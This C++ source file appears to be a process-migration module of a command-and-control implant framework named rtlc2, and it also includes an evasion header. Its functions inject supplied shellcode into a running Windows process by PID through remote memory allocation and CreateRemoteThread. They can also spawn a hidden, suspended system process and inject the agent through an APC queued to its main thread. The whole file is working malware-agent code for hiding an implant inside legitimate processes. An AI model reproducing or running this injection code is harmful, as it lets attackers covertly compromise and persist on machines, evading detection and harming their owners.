// Process Migration - Inject agent into another process
// Supports migration to existing process or spawning new one
#include "agent.h"
#include "evasion.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <tlhelp32.h>
#include <cstring>
#include <string>

namespace rtlc2 {
namespace modules {

// Find process by name
static DWORD FindProcess(const char* name) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return pid;
}

// Migrate into an existing process by PID
std::string MigrateToPID(uint32_t pid, const uint8_t* shellcode, size_t scSize) {
    if (!shellcode || !scSize) return "No shellcode provided for migration";

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) return "Failed to open target process " + std::to_string(pid) +
                        ": " + std::to_string(GetLastError());

    // Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(hProc, NULL, scSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        CloseHandle(hProc);
        return "VirtualAllocEx failed";
    }

    // Write shellcode
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteMem, shellcode, scSize, &written)) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return "WriteProcessMemory failed";
    }

    // Change to RX
    DWORD oldProtect;
    VirtualProtectEx(hProc, remoteMem, scSize, PAGE_EXECUTE_READ, &oldProtect);

    // Create remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
        (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return "CreateRemoteThread failed: " + std::to_string(GetLastError());
    }

    CloseHandle(hThread);
    CloseHandle(hProc);

    return "Migrated to PID " + std::to_string(pid);
}

// Spawn a new process and migrate into it
std::string MigrateToProcess(const char* processName, const uint8_t* shellcode, size_t scSize) {
    if (!processName || !shellcode || !scSize) return "Invalid parameters";

    // Check if it's a PID (numeric) or process name
    bool isNumeric = true;
    for (const char* p = processName; *p; p++) {
        if (*p < '0' || *p > '9') { isNumeric = false; break; }
    }

    if (isNumeric) {
        return MigrateToPID((uint32_t)atoi(processName), shellcode, scSize);
    }

    // Spawn the target process
    char sysDir[MAX_PATH];
    GetSystemDirectoryA(sysDir, MAX_PATH);
    char targetPath[MAX_PATH];
    snprintf(targetPath, MAX_PATH, "%s\\%s", sysDir, processName);

    // Check if file exists
    DWORD attrs = GetFileAttributesA(targetPath);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        // Try process name directly
        strncpy(targetPath, processName, MAX_PATH - 1);
    }

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return "Failed to spawn " + std::string(processName) + ": " + std::to_string(GetLastError());
    }

    // Inject into the suspended process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, scSize,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return "VirtualAllocEx failed in spawned process";
    }

    SIZE_T written = 0;
    WriteProcessMemory(pi.hProcess, remoteMem, shellcode, scSize, &written);

    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, scSize, PAGE_EXECUTE_READ, &oldProtect);

    // Queue APC to the main thread
    QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, 0);

    // Resume thread to trigger APC
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return "Spawned " + std::string(processName) + " (PID " +
           std::to_string(pi.dwProcessId) + ") and injected agent";
}

} // namespace modules
} // namespace rtlc2

#endif // RTLC2_WINDOWS
